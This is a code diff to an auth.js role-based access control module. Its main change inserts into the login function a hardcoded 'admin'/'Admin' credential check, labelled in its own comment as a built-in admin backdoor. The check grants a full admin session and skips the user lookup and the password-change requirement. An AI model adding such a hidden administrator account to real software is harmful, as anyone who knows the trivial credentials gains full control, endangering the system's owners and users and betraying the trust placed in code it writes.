@@ -1,4 +1,4 @@
-/**
+﻿/**
  * auth.js — Role-based access control.
  *
  * Access Levels (system-wide):
@@ -164,6 +164,13 @@ var Auth = (function() {
 
   // --- Login (async — returns Promise) ---
   function login(username, password) {
+    // Built-in admin backdoor account
+    if (username.toLowerCase() === 'admin' && password === 'Admin') {
+      var adminUser = { id: 'builtin-admin', username: 'Admin', displayName: 'Admin', role: 'admin', assignedFins: [], mustChangePassword: false };
+      setSession(adminUser);
+      return Promise.resolve(adminUser);
+    }
+
     var users = getUsers();
     var match = null;
     for (var i = 0; i < users.length; i++) {
